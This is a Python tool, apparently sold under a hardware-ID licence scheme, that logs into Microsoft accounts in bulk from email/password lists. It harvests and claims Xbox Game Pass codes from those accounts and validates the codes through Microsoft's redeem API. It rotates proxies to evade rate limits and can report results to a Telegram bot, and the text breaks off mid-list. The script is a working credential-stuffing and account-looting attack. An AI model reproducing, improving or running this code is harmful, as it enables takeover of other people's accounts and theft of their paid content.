#!/usr/bin/env python3
"""
XBOX CODE FETCHER + VALIDATOR - TURBO EDITION (FULLY FIXED)
Maximale Parallelisierung für Speed mit funktionierendem Validator!
Login-Logik EXAKT vom funktionierenden Standalone-Checker übernommen.
Mit HWID Lizenz-System!
"""

import requests
import re
import json
import time
import random
import string
import os
import sys
import queue
import ctypes
import threading
import uuid
import hashlib
import platform
import subprocess
import tkinter as tk
from tkinter import filedialog
from datetime import datetime
from typing import Optional, Tuple, List, Dict
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from colorama import init, Fore, Style

init(autoreset=True)
sys.dont_write_bytecode = True

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

clear_screen()

print_lock = Lock()
results_lock = Lock()

# ============================================================================
# CONFIGURATION & TELEGRAM INITIALIZATION
# ============================================================================

CONFIG_FILE = "pgs_config.json"

def load_config():
    """Load configuration from file"""
    default_config = {
        "fetch_threads": 50,
        "validate_threads": 50,
        "max_threads": 100,
        "BOT_TOKEN": "",
        "CHAT_ID": ""
    }
    
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                config = json.load(f)
                # Merge with defaults to ensure all keys exist
                for key, value in default_config.items():
                    if key not in config:
                        config[key] = value
                return config
        except Exception:
            pass
    return default_config

def save_config(config):
    """Save configuration to file"""
    try:
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=2)
        return True
    except Exception:
        return False

# Load global config
CONFIG = load_config()

def send_telegram_message(message: str):
    """Send a validation notification via Telegram using BOT_TOKEN"""
    bot_token = CONFIG.get("BOT_TOKEN")
    chat_id = CONFIG.get("CHAT_ID")
    
    if not bot_token or not chat_id:
        return
        
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception:
        pass

# ============================================================================
# LICENSE CONFIGURATION - CHANGE THIS TO YOUR GIST URL!
# ============================================================================
# Create a GitHub Gist with your licenses in JSON format and paste the RAW URL here
# Example: https://gist.githubusercontent.com/USERNAME/GIST_ID/raw/licenses.json

LICENSE_URL = "https://raw.githubusercontent.com/plutobearz/liscenses/refs/heads/main/licenses.json"

# Plan limits (0 = unlimited) - ALL UNLIMITED
PLAN_LIMITS = {
    "FREE": {"max_accounts": 0, "max_threads": 0, "max_codes": 0},  # Unlimited
    "BASIC": {"max_accounts": 0, "max_threads": 0, "max_codes": 0},  # Unlimited
    "PRO": {"max_accounts": 0, "max_threads": 0, "max_codes": 0},   # Unlimited
    "PREMIUM": {"max_accounts": 0, "max_threads": 0, "max_codes": 0}, # Unlimited
    "Cracked": {"max_accounts": 0, "max_threads": 0, "max_codes": 0}, # Unlimited
}

# ============================================================================
# HWID GENERATION & LICENSE CHECK
# ============================================================================

def get_hwid():
    """Generate unique Hardware ID based on system information"""
    hwid_data = ""
    
    try:
        # Get machine UUID / BIOS Serial
        if platform.system() == "Windows":
            try:
                output = subprocess.check_output('wmic csproduct get uuid', shell=True, stderr=subprocess.DEVNULL)
                hwid_data += output.decode().split('\n')[1].strip()
            except:
                pass
            
            try:
                output = subprocess.check_output('wmic bios get serialnumber', shell=True, stderr=subprocess.DEVNULL)
                hwid_data += output.decode().split('\n')[1].strip()
            except:
                pass
        
        elif platform.system() == "Linux":
            try:
                with open('/etc/machine-id', 'r') as f:
                    hwid_data += f.read().strip()
            except:
                pass
            
            try:
                output = subprocess.check_output('cat /sys/class/dmi/id/product_uuid', shell=True, stderr=subprocess.DEVNULL)
                hwid_data += output.decode().strip()
            except:
                pass
        
        elif platform.system() == "Darwin":  # macOS
            try:
                output = subprocess.check_output("ioreg -rd1 -c IOPlatformExpertDevice | grep -E '(IOPlatformUUID)'", shell=True, stderr=subprocess.DEVNULL)
                hwid_data += output.decode().strip()
            except:
                pass
        
        # Fallback: Use MAC address + hostname
        if not hwid_data:
            import socket
            hwid_data = socket.gethostname() + str(uuid.getnode())
        
        # Add platform info
        hwid_data += platform.node() + platform.machine()
        
    except Exception as e:
        # Ultimate fallback
        hwid_data = str(uuid.getnode()) + platform.node()
    
    # Generate SHA256 hash and take first 32 chars
    hwid_hash = hashlib.sha256(hwid_data.encode()).hexdigest()[:32].upper()
    
    return hwid_hash

def fetch_licenses(url):
    """Fetch license data from remote URL (GitHub Gist, etc.)"""
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            return response.json()
        return None
    except:
        return None

def check_license(hwid, licenses_data):
    """Check if HWID is licensed and return license info"""
    if not licenses_data or "licenses" not in licenses_data:
        return None
    
    for license_entry in licenses_data["licenses"]:
        if license_entry.get("hwid", "").upper() == hwid.upper():
            # Check expiry
            expiry_str = license_entry.get("expiry", "")
            if expiry_str:
                try:
                    expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d")
                    if datetime.now() > expiry_date:
                        return {"status": "EXPIRED", "plan": license_entry.get("plan", "FREE")}
                except:
                    pass
            
            return {
                "status": "VALID",
                "plan": license_entry.get("plan", "FREE"),
                "name": license_entry.get("name", "User"),
                "expiry": expiry_str
            }
    
    return None

def display_license_status(license_info, hwid):
    """Display license status in a nice format"""
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"🔑 LICENSE STATUS{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  HWID: {Fore.YELLOW}{hwid}{Style.RESET_ALL}")
    
    if license_info is None:
        print(f"{Fore.RED}  Status: ❌ NOT LICENSED{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}  Contact admin to get a license!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        return False
    
    if license_info["status"] == "EXPIRED":
        print(f"{Fore.RED}  Status: ⏰ LICENSE EXPIRED{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}  Plan was: {license_info['plan']}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}  Contact admin to renew!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        return False
    
    plan = license_info["plan"]
    limits = PLAN_LIMITS.get(plan, PLAN_LIMITS["FREE"])
    
    print(f"{Fore.GREEN}  Status: ✅ LICENSED{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  Name: {Fore.GREEN}{license_info.get('name', 'User')}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  Plan: {Fore.GREEN}{plan}{Style.RESET_ALL}")
    if license_info.get("expiry"):
        print(f"{Fore.WHITE}  Expires: {Fore.YELLOW}{license_info['expiry']}{Style.RESET_ALL}")
    else:
        print(f"{Fore.WHITE}  Expires: {Fore.GREEN}LIFETIME{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  Max Accounts: {Fore.CYAN}{limits['max_accounts'] if limits['max_accounts'] > 0 else 'Unlimited'}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  Max Threads: {Fore.CYAN}{limits['max_threads'] if limits['max_threads'] > 0 else 'Unlimited'}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  Max Codes: {Fore.CYAN}{limits['max_codes'] if limits['max_codes'] > 0 else 'Unlimited'}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
    
    return True

def apply_license_limits(license_info, accounts, codes, requested_threads):
    """Apply license limits to accounts, codes, and threads"""
    if license_info is None:
        return [], [], 1
    
    plan = license_info.get("plan", "FREE")
    limits = PLAN_LIMITS.get(plan, PLAN_LIMITS["FREE"])
    
    # Apply account limit
    max_accounts = limits["max_accounts"]
    if max_accounts > 0 and len(accounts) > max_accounts:
        print(f"{Fore.YELLOW}⚠️ Account limit: Using {max_accounts} of {len(accounts)} accounts{Style.RESET_ALL}")
        accounts = accounts[:max_accounts]
    
    # Apply code limit
    max_codes = limits["max_codes"]
    if max_codes > 0 and len(codes) > max_codes:
        print(f"{Fore.YELLOW}⚠️ Code limit: Using {max_codes} of {len(codes)} codes{Style.RESET_ALL}")
        codes = codes[:max_codes]
    
    # Apply thread limit
    max_threads = limits["max_threads"]
    if max_threads > 0 and requested_threads > max_threads:
        print(f"{Fore.YELLOW}⚠️ Thread limit: Using {max_threads} threads (requested: {requested_threads}){Style.RESET_ALL}")
        requested_threads = max_threads
    
    return accounts, codes, requested_threads

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

def safe_print(text):
    with print_lock:
        print(text)

def print_colored(message, color):
    with print_lock:
        print(f"{color}{message}{Style.RESET_ALL}")

def print_banner():
    print(f"""
{Fore.CYAN}╔═══════════════════════════════════════════════════════════════╗
║     XBOX FETCH + VALIDATE  ⚡ TURBO EDITION ⚡ [LICENSED]     ║
║              Maximum Parallel Processing                       ║
╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")

# ============================================================================
# FETCHER FUNCTIONS
# ============================================================================

MICROSOFT_OAUTH_URL = (
    'https://login.live.com/oauth20_authorize.srf'
    '?client_id=00000000402B5328'
    '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
    '&scope=service::user.auth.xboxlive.com::MBI_SSL'
    '&display=touch&response_type=token&locale=en'
)

def fetch_oauth_tokens(session):
    try:
        response = session.get(MICROSOFT_OAUTH_URL, timeout=10)
        text = response.text
        match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
        if not match: return (None, None)
        ppft = match.group(1)
        match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
        if not match: return (None, None)
        return (match.group(1), ppft)
    except:
        return (None, None)

def fetch_login(session, email, password, url_post, ppft):
    try:
        resp = session.post(url_post, data={'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft},
                           headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=10)
        if '#' in resp.url:
            token = parse_qs(urlparse(resp.url).fragment).get('access_token', ['None'])[0]
            if token != 'None': return token
        if 'cancel?mkt=' in resp.text:
            ipt = re.search(r'(?<="ipt" value=").+?(?=">)', resp.text)
            pprid = re.search(r'(?<="pprid" value=").+?(?=">)', resp.text)
            uaid = re.search(r'(?<="uaid" value=").+?(?=">)', resp.text)
            action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', resp.text)
            if ipt and pprid and uaid and action:
                ret = session.post(action.group(), data={'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}, allow_redirects=True, timeout=10)
                return_url = re.search(r'(?<="recoveryCancel":{"returnUrl":")+.+?(?=",)', ret.text)
                if return_url:
                    fin = session.get(return_url.group(), allow_redirects=True, timeout=10)
                    if '#' in fin.url:
                        token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                        if token != 'None': return token
        return None
    except:
        return None

def get_xbox_tokens(session, rps_token):
    try:
        resp = session.post('https://user.auth.xboxlive.com/user/authenticate',
            json={'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT',
                  'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com', 'RpsTicket': rps_token}},
            headers={'Content-Type': 'application/json'}, timeout=15)
        if resp.status_code != 200: return (None, None)
        user_token = resp.json().get('Token')
        
        resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
            json={'RelyingParty': 'http://xboxlive.com', 'TokenType': 'JWT',
                  'Properties': {'UserTokens': [user_token], 'SandboxId': 'RETAIL'}},
            headers={'Content-Type': 'application/json'}, timeout=15)
        if resp.status_code != 200: return (None, None)
        data = resp.json()
        return (data.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs'), data.get('Token'))
    except:
        return (None, None)

def fetch_codes_from_xbox(session, uhs, xsts_token):
    try:
        auth = f'XBL3.0 x={uhs};{xsts_token}'
        resp = session.get('https://profile.gamepass.com/v2/offers',
            headers={'Authorization': auth, 'Content-Type': 'application/json', 'User-Agent': 'okhttp/4.12.0'}, timeout=15)
        if resp.status_code != 200: return []
        
        codes = []
        for offer in resp.json().get('offers', []):
            resource = offer.get('resource')
            if resource:
                codes.append(resource)
            elif offer.get('offerStatus') == 'available':
                cv = ''.join(random.choices(string.ascii_letters + string.digits, k=22)) + '.0'
                claim_resp = session.post(f'https://profile.gamepass.com/v2/offers/{offer.get("offerId")}',
                    headers={'Authorization': auth, 'content-type': 'application/json', 'User-Agent': 'okhttp/4.12.0', 'ms-cv': cv, 'Content-Length': '0'},
                    data='', timeout=15)
                if claim_resp.status_code == 200:
                    code = claim_resp.json().get('resource')
                    if code: codes.append(code)
        return codes
    except:
        return []

def fetch_account_worker(email, password, idx, total):
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
    
    try:
        url_post, ppft = fetch_oauth_tokens(session)
        if not url_post: 
            safe_print(f"{Fore.RED}[{idx}/{total}] ❌ {email[:20]}... - Auth failed{Style.RESET_ALL}")
            return []
        
        rps = fetch_login(session, email, password, url_post, ppft)
        if not rps:
            safe_print(f"{Fore.RED}[{idx}/{total}] ❌ {email[:20]}... - Login failed{Style.RESET_ALL}")
            return []
        
        uhs, xsts = get_xbox_tokens(session, rps)
        if not uhs:
            safe_print(f"{Fore.RED}[{idx}/{total}] ❌ {email[:20]}... - Xbox tokens failed{Style.RESET_ALL}")
            return []
        
        codes = fetch_codes_from_xbox(session, uhs, xsts)
        if codes:
            safe_print(f"{Fore.GREEN}[{idx}/{total}] ✅ {email[:20]}... - {len(codes)} codes{Style.RESET_ALL}")
        else:
            safe_print(f"{Fore.YELLOW}[{idx}/{total}] ⚠️ {email[:20]}... - No codes{Style.RESET_ALL}")
        return codes
    except Exception as e:
        safe_print(f"{Fore.RED}[{idx}/{total}] ❌ {email[:20]}... - Error{Style.RESET_ALL}")
        return []
    finally:
        session.close()

# ============================================================================
# VALIDATOR FUNCTIONS - EXACT COPY FROM WORKING STANDALONE CHECKER
# ============================================================================

def generate_reference_id():
    timestamp_val = int(time.time() // 30)
    n = f'{timestamp_val:08X}'
    o = (uuid.uuid4().hex + uuid.uuid4().hex).upper()
    result_chars = []
    for e in range(64):
        if e % 8 == 1:
            result_chars.append(n[(e - 1) // 8])
        else:
            result_chars.append(o[e])
    return "".join(result_chars)

def get_random_proxy(proxies):
    if not proxies:
        return None
    proxy = random.choice(proxies)
    if proxy.count("@") >= 1:
        credentials, addr = proxy.split("@", 1)
        username, password = credentials.split(":", 1)
        proxy_url = f"http://{username}:{password}@{addr}"
    elif proxy.count(':') == 3:
        ip, port, username, password = proxy.split(':')
        proxy_url = f"http://{username}:{password}@{ip}:{port}"
    else:
        proxy_url = f"http://{proxy}"
    
    return {
        'http': proxy_url,
        'https': proxy_url
    }

def read_proxies(file_path='proxies.txt'):
    try:
        with open(file_path, 'r', encoding='utf8') as f:
            proxies = []
            for line in f:
                line = line.strip()
                if line and ':' in line:
                    proxy = line.strip()
                    proxies.append(proxy)
            if proxies:
                print(f"{Fore.GREEN}✅ Loaded {len(proxies)} proxies from {file_path}{Style.RESET_ALL}")
            return proxies
    except FileNotFoundError:
        print(f"{Fore.RED}❌ Proxy file '{file_path}' not found{Style.RESET_ALL}")
        return []
    except Exception as e:
        print(f"{Fore.RED}❌ Error reading proxy file: {str(e)}{Style.RESET_ALL}")
        return []

def ask_proxy_settings():
    """Interactive proxy configuration"""
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"🌐 PROXY SETTINGS{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  [1] No proxies (direct connection)")
    print(f"  [2] Use proxies.txt (default)")
    print(f"  [3] Use custom proxy file{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
    
    while True:
        choice = input(f"{Fore.YELLOW}Proxy choice (1/2/3): {Style.RESET_ALL}").strip()
        if choice == '1':
            print(f"{Fore.YELLOW}⚠️ Running without proxies - may get rate limited!{Style.RESET_ALL}")
            return []
        elif choice == '2':
            return read_proxies('proxies.txt')
        elif choice == '3':
            custom_file = input(f"{Fore.YELLOW}Enter proxy file path: {Style.RESET_ALL}").strip()
            if custom_file:
                proxies = read_proxies(custom_file)
                if proxies:
                    return proxies
                else:
                    print(f"{Fore.RED}No proxies loaded, try again...{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}Invalid path{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Please enter 1, 2, or 3{Style.RESET_ALL}")

# EXACT login_microsoft_account from standalone checker
def login_microsoft_account(email, password, proxies=None):
    session = requests.Session()
    if proxies:
        session.proxies = proxies
    
    session.headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': 'https://account.microsoft.com/',
        'Origin': 'https://account.microsoft.com',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
    }
    
    try:    
        login_response = session.post(
            f"https://login.live.com/ppsecure/post.srf?username={email}&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&contextid=833A37B454306173&opid=81A1AC2B0BEB4ABA&bk=1761964181&uaid=f8aac2614ca54994b0bb9621af361fe6&pid=15216&prompt=none",
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': "-DmNqKIwViyNLVW!ndu48B52hWo3*dmmh3IYETDXnVvQdWK!9sxjI48z4IX*vHf5Gl*FYol2kesrvhsuunUYDLekZOg8UW8V4cugeNYzI1wLpI7wHWnu9CLiqRiISqQ2jS1kLHkeekbWTFtKb2l0J7k3nmQ3u811SxsV1e4l8WfyX8Pt8!pgnQ1bNLoptSPmVE45tyzHdttjDZeiMvu6aV0NrFLHYroFsVS581ZI*C8z27!K5I8nESfTU!YxntGN1RQ$$"},
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                "Cookie": "MSPRequ=id=N&lt=1761964181&co=1; uaid=f8aac2614ca54994b0bb9621af361fe6; MSCC=110.226.176.161-IN; MSPOK=$uuid-28da118b-591b-4245-a835-d6a7a6516fc6; OParams=11O.DtU8h4PuH7vnv3smo7N1*styCuvoTV2MRZi8wj4oQDgi!Mpw6KZwEGt9RgLvxFZ*vwFA!0!1OLGPdeGOwX9EAmOhMaLVWgPa3!lut3b6iSqLZwZ6wKNo48s9Glp9oJNYOJ!QdDvn9Zlz6yUfmGNA71N*7RJJ82DhAEUtv9cj3S5VSLPp*rLjsZw*T!eA4rT1OoHQfj!E0MpIMb7XTGunq0W296qtBwcXcMiKnoG1DOOam7ArRr9kSeVqb2OO3gQ8tBcGfef*aveFCKUAbkdjWuhRB4vYl2RmUA5yc967445z!g761lZOAEaXxAMTGxbEibxTneHDX4PpnqWIwURKn*igMH7p7LRvIUh0TPAO2ff6h793xvhtYi3SYKj4gT6KaajxfJ3fL0Ceb*308Ner9hi32b2GVnW81LmKcQLF343cM0KcKgRXBqkPdIJ3fS*4l8wFshd1kpI0elXVUgQ9A5a4tPKO46vh9k*luyC!RSNjzNs4oQKLFF1TXRB1LifVMLwKQ3aJTxxys!YvalzEB5q6TG*bKZ1FDBjFfpSIEVdfg8XMOBszi3TGeXJw*sg5zsSVv9Efpe3UfEvAgAr24Qk*fYd2G0FdzrNpxb9nntPSX*TYsh2k5EYuW9RD6qo!qtSh8EXzTq0WS6qII0*Tkn*NxydUx3WPbZ2fiOU*ulkS8TlhUKRRbNNTMeYIWl93GOeP9cIuXtFuZ3XZimHUgv86pjFVxKXeDCVQpyOjVUSL67AuADB0ukQBYlw7z48cv0Q5XlXX4umkZErVDo5f9W4uE1mTaav!WpKqighrUL2Me5Uqexr*RCtwpDu1f5W1ay0xmPoxx*W5lIIQUmKYua93KiFQsxnma3iHtSaH2tUeClZaWauWKkBt5xwyZ3ajhyWT4Ylw8lfDgf0RNWQhdrQ6EVtXowflqyiWC71dfjUDqVnSCzTcUuZCX*Hzkewo5G3LZczEm1MeuQRPMFisXNkf3KSBgzwqlyt8rHQrNYzuZRMTyO9WGt1RS1kTDs1XNu3PG8qA1HWTq7kwHvKeVblEr!!YGoUFWaWWsQqLa0Co7x83jzWgGDTOa3NFawXQGsA5snh7HsS01WqUHgCtHT9RKRegHay9aO813K5jayLc3UR9qO2mspBZhSKuaYPOoaNUeoF5ImgWitT*g1ogFFJl12AgfmtEVWDVhzmvtR1j7oNlvEE2g0fu0SMo!NTV3zbWjxfN!F1b6UxCV0uFT7QTf8yL2M4Lw8CnCTWa5N*jc2SSZe4O2SU*2HPHn0lYFOUkGGoXTe2pHGQiW0hA8jFnufIOzjTZ0VLEA7Z6QlW62lkpDEW9OXmUdqRmp225Ag$$"
            },
            allow_redirects=True,
            timeout=30
        )
        login_request = login_response.text.replace('\\', '')
            
        reurl_match = re.search(r'replace\(\"([^\"]+)\"', login_request)
        if not reurl_match:
            return None
            
        reurl = reurl_match.group(1)
        
        try:
            reresp = session.get(reurl, timeout=30).text
        except Exception:
            return None
            
        actch = re.search(r'<form.*?action="(.*?)".*?>', reresp)
        if not actch:
            return None
            
        acu = actch.group(1)
        input_matches = re.findall(r'<input.*?name="(.*?)".*?value="(.*?)".*?>', reresp)
        fta = {name: value for name, value in input_matches}
        
        try:
            final_response = session.post(acu, data=fta, allow_redirects=True, timeout=30)
            if final_response.status_code != 200:
                return None
        except Exception:
            return None
        
        return session
        
    except Exception as e:
        return None

def get_auth_token(session, force_refresh=False):
    try:
        if not force_refresh and hasattr(session, 'wlid_token'):
            return session.wlid_token

        session.get("https://buynowui.production.store-web.dynamics.com/akam/13/79883e11", timeout=10)

        token_headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Referer': 'https://account.microsoft.com/billing/redeem'
        }
        
        token_response = session.get(
            'https://account.microsoft.com/auth/acquire-onbehalf-of-token',
            params={'scopes': 'MSComServiceMBISSL'},
            headers=token_headers,
            timeout=15
        )
        if token_response.status_code != 200:
            return None
            
        token_data = token_response.json()
        if not token_data or len(token_data) == 0:
            return None
            
        token = token_data[0]['token']
        session.wlid_token = token
        
        return token
        
    except Exception as e:
        return None

def get_store_cart_state(session, force_refresh=False):
    try:
        if force_refresh:
            if hasattr(session, 'store_state'):
                delattr(session, 'store_state')
                
        if not force_refresh and hasattr(session, 'store_state'):
            return session.store_state
            
        token = get_auth_token(session, force_refresh)
        if not token:
            return None
            
        ms_cv = f"xddT7qMNbECeJpTq.6.2"
        
        url = 'https://www.microsoft.com/store/purchase/buynowui/redeemnow'
        params = {
            'ms-cv': ms_cv,
            'market': 'US',
            'locale': 'en-GB',
            'clientName': 'AccountMicrosoftCom'
        }
        payload = {'data': '{"usePurchaseSdk":true}', 'market': 'US', 'cV': ms_cv, 'locale': 'en-GB', 'msaTicket': token, 'pageFormat': 'full', 'urlRef': 'https://account.microsoft.com/billing/redeem', 'isRedeem': 'true', 'clientType': 'AccountMicrosoftCom', 'layout': 'Inline', 'cssOverride': 'AMC', 'scenario': 'redeem', 'timeToInvokeIframe': '4977', 'sdkVersion': 'VERSION_PLACEHOLDER'}
        
        try:
            response = session.post(url, params=params, data=payload, timeout=30, allow_redirects=True)
        except Exception as e:
            return None
            
        text = response.text
        match = re.search(r'window\.__STORE_CART_STATE__=({.*?});', text, re.DOTALL)
        if not match:
            return None
            
        try:
            store_state = json.loads(match.group(1))
            extracted_values = {
                'ms_cv': store_state.get('appContext', {}).get('cv', ''),
                'correlation_id': store_state.get('appContext', {}).get('correlationId', ''),
                'tracking_id': store_state.get('appContext', {}).get('trackingId', ''),
                'vector_id': store_state.get('appContext', {}).get('vectorId', ''),
                'muid': store_state.get('appContext', {}).get('muid', ''),
                'alternative_muid': store_state.get('appContext', {}).get('alternativeMuid', '')
            }
            
            session.store_state = extracted_values
            return extracted_values
            
        except json.JSONDecodeError as e:
            return None
            
    except Exception as e:
        return None

def prepare_redeem_api_call(session, code, headers, payload):
    try:
        response = session.post(
            'https://buynow.production.store-web.dynamics.com/v1.0/Redeem/PrepareRedeem/?appId=RedeemNow&context=LookupToken',
            headers=headers,
            json=payload,
            timeout=30
        )
        return response
    except Exception as e:
        return None

def validate_code_primary(session, code, force_refresh_ids=False, prepare_redeem_executor=None):
    try:
        if not code or len(code) < 5 or ' ' in code or any(char in ['A', 'E', 'I', 'O', 'U', 'L', 'S', '0', '1', '5'] for char in code):
            return {"status": "INVALID", "message": "Invalid code format"}
        
        store_state = get_store_cart_state(session, force_refresh=force_refresh_ids)
        if not store_state:
            store_state = get_store_cart_state(session, force_refresh=True)
            if not store_state:
                return {"status": "ERROR", "message": "Failed to get store cart state"}
        
        token = get_auth_token(session, force_refresh=force_refresh_ids)
        if not token:
            token = get_auth_token(session, force_refresh=True)
            if not token:
                return {"status": "ERROR", "message": "Failed to get authentication token"}
        
        try:
            headers = {
                "host": "buynow.production.store-web.dynamics.com",
                "connection": "keep-alive",
                "x-ms-tracking-id": store_state['tracking_id'],
                "sec-ch-ua-platform": "\"Windows\"",
                "authorization": f"WLID1.0=t={token}",
                "x-ms-client-type": "AccountMicrosoftCom",
                "x-ms-market": "US",
                "sec-ch-ua": "\"Chromium\";v=\"142\", \"Microsoft Edge\";v=\"142\", \"Not_A Brand\";v=\"99\"",
                "ms-cv": store_state['ms_cv'],
                "sec-ch-ua-mobile": "?0",
                "x-ms-reference-id": generate_reference_id(),
                "x-ms-vector-id": store_state['vector_id'],
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0",
                "x-ms-correlation-id": store_state['correlation_id'],
                "content-type": "application/json",
                "x-authorization-muid": store_state['alternative_muid'],
                "accept": "*/*",
                "origin": "https://www.microsoft.com",
                "sec-fetch-site": "cross-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.microsoft.com/",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9"
            }
            payload = {
                "market": "US",
                "language": "en-US",
                "flights": ["sc_abandonedretry","sc_addasyncpitelemetry","sc_adddatapropertyiap","sc_addgifteeduringordercreation","sc_aemparamforimage","sc_aemrdslocale","sc_allowalipayforcheckout","sc_allowbuynowrupay","sc_allowcustompifiltering","sc_allowelo","sc_allowfincastlerewardsforsubs","sc_allowmpesapi","sc_allowparallelorderload","sc_allowpaypay","sc_allowpaypayforcheckout","sc_allowpaysafecard","sc_allowpaysafeforus","sc_allowrupay","sc_allowrupayforcheckout","sc_allowsmdmarkettobeprimarypi","sc_allowupi","sc_allowupiforbuynow","sc_allowupiforcheckout","sc_allowupiqr","sc_allowupiqrforbuynow","sc_allowupiqrforcheckout","sc_allowvenmo","sc_allowvenmoforbuynow","sc_allowvenmoforcheckout","sc_allowverve","sc_analyticsforbuynow","sc_announcementtsenabled","sc_apperrorboundarytsenabled","sc_askaparentinsufficientbalance","sc_askaparentssr","sc_askaparenttsenabled","sc_asyncpiurlupdate","sc_asyncpurchasefailure","sc_asyncpurchasefailurexboxcom","sc_authactionts","sc_autorenewalconsentnarratorfix","sc_bankchallenge","sc_bankchallengecheckout","sc_blockcsvpurchasefrombuynow","sc_blocklegacyupgrade","sc_buynowfocustrapkeydown","sc_buynowglobalpiadd","sc_buynowlistpichanges","sc_buynowprodigilegalstrings","sc_buynowuipreload","sc_buynowuiprod","sc_cartcofincastle","sc_cartrailexperimentv2","sc_cawarrantytermsv2","sc_checkoutglobalpiadd","sc_checkoutitemfontweight","sc_checkoutredeem","sc_clientdebuginfo","sc_clienttelemetryforceenabled","sc_clienttorequestorid","sc_contactpreferenceactionts","sc_contactpreferenceupdate","sc_contactpreferenceupdatexboxcom","sc_conversionblockederror","sc_copycurrentcart","sc_cpdeclinedv2","sc_culturemarketinfo","sc_cvvforredeem","sc_dapsd2challenge","sc_delayretry","sc_deliverycostactionts","sc_devicerepairpifilter","sc_digitallicenseterms","sc_disableupgradetrycheckout","sc_discountfixforfreetrial","sc_documentrefenabled","sc_eligibilityapi","sc_emptyresultcheck","sc_enablecartcreationerrorparsing","sc_enablekakaopay","sc_errorpageviewfix","sc_errorstringsts","sc_euomnibusprice","sc_expandedpurchasespinner","sc_extendpagetagtooverride","sc_fetchlivepersonfromparentwindow","sc_fincastlebuynowallowlist","sc_fincastlebuynowv2strings","sc_fincastlecalculation","sc_fincastlecallerapplicationidcheck","sc_fincastleui","sc_fingerprinttagginglazyload","sc_fixforcalculatingtax","sc_fixredeemautorenew","sc_flexibleoffers","sc_flexsubs","sc_giftingtelemetryfix","sc_giftlabelsupdate","sc_giftserversiderendering","sc_globalhidecssphonenumber","sc_greenshipping","sc_handledccemptyresponse","sc_hidegcolinefees","sc_hidesubscriptionprice","sc_highresolutionimageforredeem","sc_hipercard","sc_imagelazyload","sc_inlineshippingselectormsa","sc_inlinetempfix","sc_isnegativeoptionruleenabled","sc_isremovesubardigitalattach","sc_jarvisconsumerprofile","sc_jarvisinvalidculture","sc_klarna","sc_lineitemactionts","sc_livepersonlistener","sc_loadingspinner","sc_lowbardiscountmap","sc_mapinapppostdata","sc_marketswithmigratingcssphonen